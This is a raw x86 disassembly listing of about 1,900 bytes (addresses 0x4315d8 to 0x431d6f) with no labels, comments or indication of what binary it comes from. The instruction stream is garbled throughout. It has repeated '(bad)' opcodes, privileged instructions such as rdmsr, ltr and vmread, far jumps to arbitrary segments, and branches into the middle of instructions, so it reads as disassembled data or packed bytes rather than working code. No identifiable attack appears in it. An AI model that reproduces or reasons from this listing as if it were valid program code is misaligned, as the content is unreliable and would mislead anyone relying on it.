  4315d8:	dec    DWORD PTR [ebx-0x460f0375]
  4315de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4315df:	add    esi,edi
  4315e1:	add    bh,bh
  4315e3:	rdpmc  
  4315e5:	add    BYTE PTR [ebx],0x1
  4315e8:	mov    DWORD PTR [eax],eax
  4315ea:	add    al,0x45
  4315ec:	dec    DWORD PTR [ecx-0x360b3373]
  4315f2:	dec    DWORD PTR [esi]
  4315f4:	push   eax
  4315f5:	jne    0x43163c
  4315f7:	mov    esi,DWORD PTR [ebx]
  4315f9:	cld    
  4315fa:	add    esp,ecx
  4315fc:	push   eax
  4315fd:	inc    DWORD PTR [ebp-0x75]
  431600:	add    eax,0x800e4
  431605:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43160b:	mov    DWORD PTR [ecx],eax
  43160d:	sbb    al,0x0
  43160f:	leave  
  431610:	test   DWORD PTR [edi-0x2],eax
  431613:	jne    0x431614
  431615:	call   0xff44001a
  43161a:	xor    BYTE PTR [ebp+0x4d],al
  43161d:	mov    edi,edi
  43161f:	enter  0x8,0x4d
  431623:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  431629:	mov    eax,DWORD PTR [eax]
  43162b:	cld    
  43162c:	add    DWORD PTR [ecx],ebx
  43162e:	inc    ebp
  43162f:	dec    ebp
  431630:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  431636:	inc    eax
  431637:	dec    DWORD PTR [ecx-0x270375]
  43163d:	add    BYTE PTR [ebx-0x39d72701],cl
  431643:	xchg   ecx,eax
  431644:	ret    
  431645:	add    BYTE PTR [ebp-0x830075],al
  43164b:	add    BYTE PTR [ebp-0x75],al
  43164e:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431654:	lea    edi,[edi-0xc]
  431657:	add    bh,bh
  431659:	mov    edx,DWORD PTR [eax-0x7b]
  43165c:	inc    ebp
  43165d:	rdpmc  
  43165f:	jne    0x431664
  431661:	add    BYTE PTR [eax-0x75],dl
  431664:	inc    ebp
  431665:	clc    
  431666:	add    eax,0x400009
  43166b:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431671:	mov    eax,DWORD PTR [ecx]
  431673:	in     al,dx
  431674:	add    dh,al
  431676:	test   ebx,eax
  431678:	inc    BYTE PTR [ebp-0xff0001]
  43167e:	add    BYTE PTR [ebp-0x43],al
  431681:	cmp    esi,0xfffffff8
  431684:	(bad)  
  431685:	push   DWORD PTR [eax]
  431687:	add    BYTE PTR [ebp-0x3a],dl
  43168a:	test   ebx,eax
  43168c:	je     0x431613
  43168e:	mov    edi,edi
  431690:	sbb    al,0xff
  431692:	test   DWORD PTR gs:[eax],eax
  431695:	(bad)  
  431696:	js     0x431697
  431698:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43169e:	sub    eax,ebx
  4316a0:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4316a6:	add    eax,DWORD PTR [eax]
  4316a8:	dec    ebp
  4316a9:	push   eax
  4316aa:	mov    al,BYTE PTR [ebp+0x1]
  4316ad:	mov    eax,DWORD PTR [ebp-0x68]
  4316b0:	mov    eax,DWORD PTR [eax]
  4316b2:	sbb    bh,al
  4316b4:	or     ah,dh
  4316b6:	dec    ebp
  4316b7:	inc    DWORD PTR [eax+0x4]
  4316ba:	push   ecx
  4316bb:	add    BYTE PTR [edx-0x1],dh
  4316be:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4316c4:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4316ce:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4316d4:	push   ecx
  4316d5:	cmp    BYTE PTR [ebx],al
  4316d7:	inc    ebp
  4316d8:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4316de:	(bad)  
  4316df:	(bad)  
  4316e0:	in     al,0xff
  4316e2:	add    BYTE PTR [ebp+0x0],al
  4316e5:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4316eb:	add    al,bh
  4316ed:	(bad)  
  4316ee:	jmp    0x8d85:0x74b0558d
  4316f5:	dec    DWORD PTR [eax]
  4316f7:	call   DWORD PTR [ebp-0x7b]
  4316fa:	mov    edi,esi
  4316fc:	lock call DWORD PTR [ebp-0x75]
  431700:	mov    esi,esp
  431702:	mov    ah,0xc6
  431704:	mov    bh,0xc3
  431706:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43170c:	add    DWORD PTR [eax],0x450050ff
  431712:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431718:	inc    edi
  43171a:	push   esp
  43171c:	jmp    0xcd00:0x650481ff
  431723:	mov    DWORD PTR [ebx],esi
  431725:	clc    
  431726:	cmp    edi,0xff9cff3c
  43172c:	jne    0x431736
  43172e:	mov    eax,eax
  431730:	add    esi,DWORD PTR [eax]
  431732:	int3   
  431733:	inc    ebp
  431734:	cmp    al,0x83
  431736:	add    BYTE PTR [eax],bl
  431738:	adc    DWORD PTR [ebx+0x768b5055],eax
  43173e:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431744:	mov    edi,eax
  431746:	cmp    BYTE PTR [ebp+0x45],cl
  431749:	jmp    0x4316d6
  43174b:	mov    ebx,DWORD PTR [esp+ebp*8]
  43174e:	inc    ebp
  43174f:	or     al,0x2
  431751:	dec    DWORD PTR [ebp+0x18]
  431754:	jne    0x4317ab
  431756:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  43175c:	mov    edi,DWORD PTR [ebx]
  43175e:	in     al,0x50
  431760:	xchg   ecx,eax
  431761:	jmp    0x3436666
  431766:	adc    al,0x8b
  431768:	inc    ebp
  431769:	mov    al,ds:0x8b04008b
  43176e:	push   ebp
  43176f:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431775:	push   ebp
  431776:	test   DWORD PTR [ebx-0x2800d701],ecx
  43177c:	inc    ebp
  43177d:	dec    ebp
  43177e:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431784:	mov    DWORD PTR [eax],0xe9ff00f4
  43178a:	add    al,0x0
  43178c:	add    BYTE PTR [eax],al
  43178e:	mov    eax,edx
  431790:	push   eax
  431791:	rol    DWORD PTR [ebp-0xf0177],1
  431797:	bound  eax,QWORD PTR [ebp+0x50]
  43179a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4317a0:	add    BYTE PTR [ecx+0x558df0ff],cl
  4317a6:	mov    al,0xf
  4317a8:	test   DWORD PTR [edx],edx
  4317aa:	call   DWORD PTR [ebp-0x7a0001]
  4317b0:	(bad)  
  4317b1:	loop   0x4317b2
  4317b3:	jnp    0xc6990bb9
  4317b9:	mov    eax,ebx
  4317bb:	cmp    al,0x8b
  4317bd:	(bad)  
  4317be:	cld    
  4317bf:	shr    esi,0xc
  4317c2:	add    dl,al
  4317c4:	push   eax
  4317c5:	lea    eax,[ebp-0x1]
  4317c8:	mov    edx,esi
  4317ca:	cwde   
  4317cb:	cli    
  4317cc:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4317d2:	or     BYTE PTR [eax],cl
  4317d4:	inc    ebp
  4317d5:	dec    ebp
  4317d6:	inc    DWORD PTR [ebx+0x74803914]
  4317dc:	add    DWORD PTR [ebx+0x451800],ecx
  4317e2:	call   DWORD PTR [eax+edx*1]
  4317e5:	add    ecx,DWORD PTR [ebp-0x34]
  4317e8:	push   edi
  4317e9:	adc    al,0x8
  4317eb:	mov    edx,DWORD PTR [ebp-0x14]
  4317ee:	mov    ecx,DWORD PTR [ebp+0x18]
  4317f1:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4317f5:	inc    DWORD PTR [eax+esi*8]
  4317f8:	inc    ebp
  4317f9:	stos   BYTE PTR es:[edi],al
  4317fa:	mov    edx,DWORD PTR [ebp-0x4]
  4317fd:	add    DWORD PTR [ebp-0x1c],eax
  431800:	mov    edx,DWORD PTR [ebp-0x70]
  431803:	cmp    eax,DWORD PTR [eax]
  431805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431806:	mov    eax,DWORD PTR [eax]
  431808:	cld    
  431809:	jae    0x43178b
  43180b:	add    eax,DWORD PTR [ecx]
  43180d:	clc    
  43180e:	add    BYTE PTR [eax+0x30],dl
  431811:	mov    DWORD PTR [ecx],esi
  431813:	clc    
  431814:	pop    ds
  431815:	inc    ebp
  431816:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43181c:	(bad)  
  43181d:	push   DWORD PTR [edi]
  43181f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431825:	(bad)  
  431826:	jae    0x431827
  431828:	mov    eax,DWORD PTR [ebp-0x740175]
  43182e:	sub    eax,DWORD PTR [eax]
  431830:	add    eax,DWORD PTR [eax]
  431832:	mov    DWORD PTR [ecx+0x5f],eax
  431835:	mov    DWORD PTR [ebx-0x4],ebx
  431838:	ret    0xff
  43183b:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431841:	ret    
  431842:	mov    eax,DWORD PTR [ebp-0x6f0075]
  431848:	add    BYTE PTR [ebp-0x7d],al
  43184b:	mov    DWORD PTR [eax],eax
  43184d:	add    al,0x84
  43184f:	inc    DWORD PTR [ecx]
  431851:	lea    eax,[eax]
  431853:	hlt    
  431854:	sar    bh,cl
  431856:	test   BYTE PTR [eax+0x1],dl
  431859:	inc    ebp
  43185a:	add    BYTE PTR [ebx],dh
  43185c:	test   BYTE PTR [ebx],0x84
  43185f:	push   eax
  431860:	add    BYTE PTR [ebp+0x0],al
  431863:	add    eax,0x86
  431868:	add    BYTE PTR [ebx-0x7f7b0340],cl
  43186e:	add    BYTE PTR [ecx],al
  431870:	add    BYTE PTR [eax],al
  431872:	mov    esi,0x550030
  431877:	mov    ecx,DWORD PTR [edi]
  431879:	cld    
  43187a:	fidiv  DWORD PTR [ebp+0x0]
  43187d:	mov    edi,DWORD PTR [ecx]
  43187f:	xor    BYTE PTR [eax+eax*1],0x84
  431883:	add    eax,DWORD PTR [eax]
  431885:	sbb    BYTE PTR [eax],al
  431887:	jne    0x43183a
  431889:	mov    eax,DWORD PTR [ecx]
  43188b:	sbb    BYTE PTR [eax],al
  43188d:	mov    DWORD PTR [ebp-0x1],esp
  431890:	add    BYTE PTR [eax+0x30e45ca],bh
  431896:	ret    0xb7fc
  431899:	dec    ebp
  43189a:	or     al,0x89
  43189c:	dec    ebp
  43189d:	cld    
  43189e:	cmovne ecx,DWORD PTR [eax-0x75]
  4318a2:	add    edi,esp
  4318a4:	seto   BYTE PTR [esi-0x72ffffff]
  4318ab:	inc    ebp
  4318ac:	adc    al,0x8b
  4318ae:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4318b5:	cmp    DWORD PTR [edi+0x72],edx
  4318b8:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4318be:	gs cmp al,0x0
  4318c1:	je     0x431899
  4318c3:	push   eax
  4318c4:	sar    BYTE PTR [eax],1
  4318c6:	mov    bh,0x3e
  4318c8:	push   cs
  4318c9:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4318cf:	add    DWORD PTR [ecx+0x12],ebp
  4318d2:	dec    edx
  4318d3:	(bad)  
  4318d4:	mov    eax,edx
  4318d6:	in     al,dx
  4318d7:	adc    DWORD PTR [ecx],esi
  4318d9:	pop    esi
  4318da:	inc    ecx
  4318db:	leave  
  4318dc:	or     DWORD PTR [eax],ebx
  4318de:	gs push ebp
  4318e0:	add    ah,ch
  4318e2:	into   
  4318e3:	in     al,dx
  4318e4:	enter  0xb756,0xf0
  4318e8:	push   cs
  4318e9:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4318f3:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4318f9:	jnp    0x74439e01
  4318ff:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431905:	add    BYTE PTR [edi],cl
  431907:	mov    edi,DWORD PTR [ecx-0x78]
  43190a:	ltr    WORD PTR [ecx-0x7b]
  43190e:	dec    DWORD PTR [edi]
  431910:	clc    
  431911:	out    0x45,eax
  431913:	add    BYTE PTR [eax],cl
  431915:	cmp    ebx,0xffffff8c
  431918:	jge    0x43191a
  43191a:	jb     0x43192c
  43191c:	je     0x52199c
  431922:	pop    edx
  431923:	push   esi
  431924:	mov    ecx,DWORD PTR [edi]
  431926:	in     al,dx
  431927:	rol    DWORD PTR [ebp+0x0],1
  43192a:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431931:	cmp    DWORD PTR [ecx],0xfffffff0
  431934:	hlt    
  431935:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43193b:	(bad)  
  43193d:	push   eax
  43193e:	jns    0xb842fdbc
  431944:	lock push cs
  431946:	ror    edx,0x3
  431949:	test   BYTE PTR [ecx+0x5500e800],cl
  43194f:	dec    eax
  431950:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431954:	(bad)  
  431955:	mov    esi,0x7f33ff5f
  43195a:	inc    eax
  43195b:	test   DWORD PTR [edx],eax
  43195d:	je     0x43191f
  43195f:	mov    ecx,ecx
  431961:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431965:	and    eax,DWORD PTR [eax+0xf0103]
  43196b:	jp     0x431959
  43196d:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431971:	add    edx,DWORD PTR [edi+0x74]
  431974:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43197a:	add    BYTE PTR [ebp-0x74c48bbb],al
  431980:	je     0x431905
  431982:	cmp    eax,edi
  431984:	js     0x4319a9
  431986:	add    eax,0xeb0fc003
  43198b:	jns    0x431918
  43198d:	vmread DWORD PTR [ecx+0x45],ebx
  431991:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431997:	adc    al,0x8b
  431999:	jge    0x4319af
  43199b:	mov    edi,DWORD PTR [eax-0x4]
  43199e:	add    edi,DWORD PTR [edi]
  4319a0:	or     bh,bh
  4319a2:	push   ebp
  4319a3:	push   es
  4319a4:	mov    DWORD PTR [ebp-0x4],ebx
  4319a7:	add    edi,esi
  4319a9:	pop    es
  4319aa:	add    esi,DWORD PTR [edi-0x48ccf183]
  4319b0:	mov    DWORD PTR [esp+esi*8],ecx
  4319b3:	inc    ebp
  4319b4:	pop    ebp
  4319b5:	xor    DWORD PTR [esi-0x4],0x3b
  4319b9:	add    edx,DWORD PTR [ecx+edi*1]
  4319bc:	push   es
  4319bd:	clc    
  4319be:	mov    bh,0xdb
  4319c0:	jp     0x431979
  4319c2:	add    cl,BYTE PTR [esi]
  4319c4:	div    DWORD PTR [edi+0x4d8b0c1c]
  4319ca:	test   edi,edi
  4319cc:	je     0x4319c2
  4319ce:	mov    eax,ecx
  4319d0:	or     BYTE PTR [ebx],al
  4319d2:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4319d8:	jbe    0x431a4c
  4319da:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4319e0:	add    ecx,DWORD PTR [esi]
  4319e2:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4319e8:	add    eax,DWORD PTR [ebx-0x287af783]
  4319ee:	je     0x431a3d
  4319f0:	mov    DWORD PTR [ecx],edi
  4319f2:	mov    esi,eax
  4319f4:	hlt    
  4319f5:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4319fc:	jb     0x4319be
  4319fe:	jmp    0x4319eb
  431a00:	xor    esi,DWORD PTR [ebx]
  431a02:	pop    edi
  431a03:	pop    esi
  431a04:	pop    ebx
  431a05:	ret    
  431a06:	ret    0x8b
  431a09:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a0f:	xor    DWORD PTR [ecx],0xc
  431a12:	pushf  
  431a13:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431a19:	rdmsr  
  431a1b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431a22:	dec    ebp
  431a23:	ret    
  431a24:	mov    edi,DWORD PTR [esi-0x4]
  431a27:	pop    eax
  431a28:	dec    ebp
  431a29:	jne    0x4319b6
  431a2b:	xor    edi,esp
  431a2d:	inc    eax
  431a2e:	dec    ebp
  431a2f:	jbe    0x431a84
  431a31:	inc    eax
  431a32:	pop    ebp
  431a33:	add    edx,DWORD PTR [esi+0x8]
  431a36:	push   esp
  431a37:	dec    eax
  431a38:	push   ecx
  431a39:	mov    eax,edi
  431a3b:	and    al,0xf0
  431a3d:	jo     0x431a2a
  431a3f:	mov    eax,DWORD PTR [ebx]
  431a41:	sbb    BYTE PTR [ebp+0x4d],cl
  431a44:	mov    eax,DWORD PTR [ebx]
  431a46:	nop
  431a47:	or     BYTE PTR [eax],al
  431a49:	jne    0x431aa2
  431a4b:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431a51:	cld    
  431a52:	xor    edi,edi
  431a54:	add    edi,DWORD PTR [ebp+0x3]
  431a57:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431a5d:	js     0x4319e3
  431a5f:	jae    0x431a63
  431a61:	(bad)  
  431a63:	xor    al,0x5d
  431a65:	jmp    0x4319f2
  431a67:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431a6e:	fdecstp 
  431a70:	test   BYTE PTR [edi],ah
  431a72:	add    bh,BYTE PTR [ebp+0x0]
  431a75:	add    ebx,DWORD PTR [ebp-0x77]
  431a78:	mov    edi,eax
  431a7a:	cmp    al,0x0
  431a7d:	adc    dh,BYTE PTR [ebx]
  431a7f:	jge    0x431a84
  431a81:	mov    edi,DWORD PTR [ebx]
  431a83:	jl     0x431a94
  431a85:	clc    
  431a86:	dec    edi
  431a87:	jge    0x431a89
  431a89:	mov    eax,DWORD PTR [ebx]
  431a8b:	jb     0x431a95
  431a8d:	mov    ecx,DWORD PTR [ebp-0x8]
  431a90:	mov    edi,edi
  431a92:	xor    edx,DWORD PTR [eax]
  431a94:	add    edi,DWORD PTR [ebx]
  431a96:	mov    DWORD PTR [ebp-0x10],edi
  431a99:	inc    edi
  431a9a:	pop    ebp
  431a9b:	jge    0x431ad8
  431a9d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431aa1:	mov    edx,0xc05d87f0
  431aa6:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431aaa:	fimul  WORD PTR [eax]
  431aac:	fist   WORD PTR [ebp+0x1c]
  431aaf:	in     al,dx
  431ab0:	jne    0x431a9e
  431ab2:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431ab8:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431abc:	fdivp  st(0),st
  431abe:	fild   WORD PTR [ebp+0x4510f85c]
  431ac4:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431aca:	inc    ebp
  431acb:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431ad1:	mov    ebp,DWORD PTR [ebx-0x4]
  431ad4:	adc    al,0x8b
  431ad6:	rcl    DWORD PTR [eax],0x48
  431ad9:	mov    esi,0x7080803
  431ade:	fiadd  WORD PTR [ebp+0x4d]
  431ae1:	(bad)  
  431ae2:	mov    edx,DWORD PTR [edx-0x4]
  431ae5:	mov    edx,DWORD PTR [ebp-0x4]
  431ae8:	xor    ebx,DWORD PTR [ebx+0x330103]
  431aee:	mov    DWORD PTR [edi+0x872dc],edi
  431af4:	xlat   BYTE PTR ds:[ebx]
  431af5:	into   
  431af6:	ffreep st(6)
  431af8:	retf   0x6c7
  431afb:	iret   
  431afc:	dec    ebp
  431afd:	inc    ebp
  431afe:	mov    DWORD PTR [ebx],edi
  431b00:	fmul   QWORD PTR [edi]
  431b02:	dec    ebp
  431b03:	jnp    0x431b38
  431b05:	add    BYTE PTR [ebx],al
  431b07:	mov    ecx,DWORD PTR [esp+edi*8]
  431b0a:	inc    ebp
  431b0b:	dec    ebp
  431b0c:	lea    esi,[ebx]
  431b0e:	add    DWORD PTR [ebx],eax
  431b10:	jb     0x431b4d
  431b12:	add    BYTE PTR [edi],cl
  431b14:	inc    ebp
  431b15:	imul   eax,edi,0x858bd800
  431b1b:	cld    
  431b1c:	clc    
  431b1d:	mov    DWORD PTR [ebp+0x0],eax
  431b20:	inc    DWORD PTR [eax]
  431b22:	or     al,0xde
  431b24:	sbb    bh,0x1
  431b27:	retf   
  431b28:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431b2f:	dec    ebp
  431b30:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431b36:	enter  0x12de,0xdf
  431b3a:	inc    ebp
  431b3b:	pop    ebp
  431b3c:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b42:	add    DWORD PTR [edx],edx
  431b44:	add    BYTE PTR [ebp+0x50],dl
  431b47:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431b4d:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431b53:	or     ah,al
  431b55:	pop    ss
  431b56:	cdq    
  431b57:	push   ebp
  431b58:	clc    
  431b59:	mov    eax,DWORD PTR [ebp-0x4]
  431b5c:	xor    edx,edx
  431b5e:	add    esi,DWORD PTR [ebx]
  431b60:	cmp    eax,DWORD PTR [ebx]
  431b62:	hlt    
  431b63:	cmp    DWORD PTR [ebx],esp
  431b65:	or     al,BYTE PTR [ebp+0xf]
  431b68:	mov    eax,DWORD PTR [edx]
  431b6a:	loopne 0x431b6c
  431b6c:	(bad)  
  431b6d:	mov    ecx,esi
  431b6f:	cld    
  431b70:	pushf  
  431b71:	pop    ebp
  431b72:	fwait
  431b73:	mov    esi,DWORD PTR [edx]
  431b75:	lock mov eax,eax
  431b78:	adc    BYTE PTR [ebx],al
  431b7a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431b81:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431b87:	dec    ebp
  431b88:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431b8e:	(bad)  
  431b8f:	iret   
  431b90:	inc    ebp
  431b91:	(bad)  
  431b92:	jne    0x431be1
  431b94:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431b9a:	(bad)  
  431b9b:	cmp    ebx,eax
  431b9d:	je     0x431b25
  431b9f:	add    edi,edi
  431ba1:	or     bh,bh
  431ba3:	dec    ebp
  431ba4:	inc    ebp
  431ba5:	mov    esi,DWORD PTR [ebx]
  431ba7:	cld    
  431ba8:	add    ecx,esi
  431baa:	cmp    ecx,DWORD PTR [eax-0xc]
  431bad:	mov    edx,DWORD PTR [edi]
  431baf:	or     BYTE PTR [ebp-0x7c],al
  431bb2:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431bb8:	test   BYTE PTR [ebx+ebx*4],cl
  431bbb:	inc    ebp
  431bbc:	xor    bh,BYTE PTR [esi]
  431bbe:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431bc5:	jne    0x431b8e
  431bc7:	mov    ebp,esp
  431bc9:	fcomp  DWORD PTR [ebx]
  431bcb:	add    BYTE PTR [ecx],al
  431bcd:	inc    DWORD PTR [ebp-0x75]
  431bd0:	(bad)  
  431bd1:	cld    
  431bd2:	add    al,0xce
  431bd4:	mov    ecx,edi
  431bd6:	cld    
  431bd7:	inc    ebp
  431bd8:	fidivr WORD PTR [ebx]
  431bda:	fbstp  TBYTE PTR [ebp-0x3e]
  431bdd:	mov    eax,DWORD PTR [eax]
  431bdf:	adc    BYTE PTR [ebx-0x3974038b],cl
  431be5:	fadd   st,st(7)
  431be7:	add    BYTE PTR [ebp-0x1],al
  431bea:	mov    ecx,DWORD PTR [esp+edi*8]
  431bed:	inc    ebp
  431bee:	mov    bh,0xc7
  431bf1:	loopne 0x431c38
  431bf3:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431bf9:	sbb    dh,BYTE PTR [ebx]
  431bfb:	pushf  
  431bfc:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c02:	mov    eax,edi
  431c04:	cwde   
  431c05:	inc    ebp
  431c06:	inc    ebp
  431c07:	jne    0x431b94
  431c09:	mov    esp,esp
  431c0b:	clc    
  431c0c:	add    al,0x4d
  431c0e:	mov    DWORD PTR [ebx],esi
  431c10:	or     al,0x33
  431c12:	inc    ebp
  431c13:	lea    ecx,[ebx-0x398d13fd]
  431c19:	add    bh,al
  431c1b:	inc    ebp
  431c1c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431c23:	add    ebp,esp
  431c25:	shufps xmm1,xmm3,0xc7
  431c29:	(bad)  
  431c2a:	jmp    0x74885753
  431c2f:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431c35:	hlt    
  431c36:	mov    ecx,DWORD PTR [edi]
  431c38:	fadd   DWORD PTR [ebp+0x0]
  431c3b:	xor    ecx,DWORD PTR [edi]
  431c3d:	add    ecx,ecx
  431c3f:	cmp    edi,edi
  431c41:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c45:	(bad)  
  431c46:	jmp    0x431bd3
  431c48:	mov    edi,esp
  431c4a:	or     al,0xc6
  431c4c:	inc    ebp
  431c4d:	(bad)  
  431c4e:	mov    eax,DWORD PTR [ebp+0x10]
  431c51:	jne    0x431bdc
  431c53:	mov    eax,DWORD PTR [ecx]
  431c55:	clc    
  431c56:	add    BYTE PTR [ebp-0x40],cl
  431c59:	xor    edx,DWORD PTR [eax-0x73]
  431c5c:	jne    0x431c5f
  431c5e:	push   DWORD PTR [edx+0x8]
  431c61:	add    BYTE PTR [ebp+0x45],al
  431c64:	mov    ebp,ecx
  431c66:	cld    
  431c67:	add    BYTE PTR [ebp+0x0],cl
  431c6a:	xor    eax,DWORD PTR [ebp+0x3]
  431c6d:	mov    DWORD PTR [ebx],edi
  431c6f:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431c75:	sub    eax,0x5d330e4d
  431c7a:	lea    esi,[ebx]
  431c7c:	add    DWORD PTR [ebx],eax
  431c7e:	jb     0x431c69
  431c80:	add    BYTE PTR [eax],al
  431c82:	inc    ebp
  431c83:	add    bl,ch
  431c85:	inc    ebp
  431c86:	mov    esi,DWORD PTR [ebx]
  431c88:	or     al,0x3
  431c8a:	(bad)  
  431c8b:	mov    edi,eax
  431c8d:	in     al,dx
  431c8e:	scas   eax,DWORD PTR es:[edi]
  431c8f:	inc    ebp
  431c90:	mov    esi,DWORD PTR [ebx]
  431c92:	in     al,0x3
  431c94:	add    al,0x89
  431c96:	mov    ecx,DWORD PTR [eax+edi*8]
  431c99:	dec    ebp
  431c9a:	(bad)  
  431c9b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431ca2:	mov    ecx,eax
  431ca4:	cld    
  431ca5:	push   es
  431ca6:	dec    ebp
  431ca7:	add    al,0x33
  431ca9:	mov    DWORD PTR [ebx],eax
  431cab:	in     al,dx
  431cac:	cmp    DWORD PTR [ebp-0x67],eax
  431caf:	mov    eax,DWORD PTR [ebp-0xba0068]
  431cb5:	mov    edx,DWORD PTR [ebp-0x4]
  431cb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  431cbb:	xor    eax,DWORD PTR [ebp+0x3]
  431cbe:	cmp    DWORD PTR [ebx],0x8b32749a
  431cc4:	xor    edi,esp
  431cc6:	jmp    0xff771a18
  431ccb:	add    ecx,DWORD PTR [ebp-0x3f]
  431cce:	xor    ebx,DWORD PTR [edi]
  431cd0:	add    eax,ecx
  431cd2:	cmp    ebx,DWORD PTR [eax]
  431cd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431cd7:	mov    ecx,DWORD PTR [eax]
  431cd9:	adc    BYTE PTR [ebp-0x80],al
  431cdc:	jmp    0x431cdf
  431cde:	mov    eax,DWORD PTR [eax]
  431ce0:	cld    
  431ce1:	mov    bh,0xc6
  431ce3:	push   ecx
  431ce4:	(bad)  
  431ce5:	jne    0x431d45
  431ce7:	dec    ecx
  431ce9:	or     BYTE PTR [ecx+ebx*1],cl
  431cec:	push   ebp
  431ced:	inc    ebp
  431cee:	in     al,dx
  431cef:	add    ebp,esp
  431cf1:	or     bh,al
  431cf3:	dec    ebp
  431cf4:	cld    
  431cf5:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431cfb:	xor    DWORD PTR [edx],0x2
  431cfe:	pushf  
  431cff:	dec    DWORD PTR [ebx+0x45510cf4]
  431d05:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431d0b:	mov    edx,DWORD PTR [ecx+0xc]
  431d0e:	xor    eax,esi
  431d10:	mov    edx,0xc172c7
  431d15:	inc    ebp
  431d16:	mov    esi,DWORD PTR [ebp+0x8]
  431d19:	mov    eax,edx
  431d1b:	call   0x84c7e410
  431d20:	add    DWORD PTR [ebx-0x76bace00],ebx
  431d26:	mov    ebp,eax
  431d28:	or     BYTE PTR [eax],dl
  431d2a:	jo     0x431d79
  431d2c:	push   edi
  431d2d:	xor    esi,DWORD PTR [ebp+0x3]
  431d30:	(bad)  
  431d31:	pmulhuw mm0,mm1
  431d34:	test   DWORD PTR [ebp-0x8],ecx
  431d37:	mov    DWORD PTR [ebp-0x67],eax
  431d3a:	mov    eax,DWORD PTR [ebp-0x4]
  431d3d:	xor    edi,DWORD PTR [ebp-0x73]
  431d40:	xor    eax,DWORD PTR [ebx]
  431d42:	xor    esi,DWORD PTR [edx+0x3]
  431d45:	add    BYTE PTR [ecx],bh
  431d47:	inc    ebp
  431d48:	(bad)  
  431d49:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d4f:	mov    DWORD PTR [eax],0x750f0004
  431d55:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d5b:	lock add BYTE PTR [ebp+0x0],cl
  431d5f:	mov    esi,DWORD PTR [ebp-0x18]
  431d62:	mov    ebp,edx
  431d64:	or     al,0x72
  431d66:	ja     0x431d68
  431d68:	mov    edx,esi
  431d6a:	cld    
  431d6b:	(bad)  
  431d6e:	cli    
  431d6f:	mov    esi,DWORD PTR [ebp-0x4]
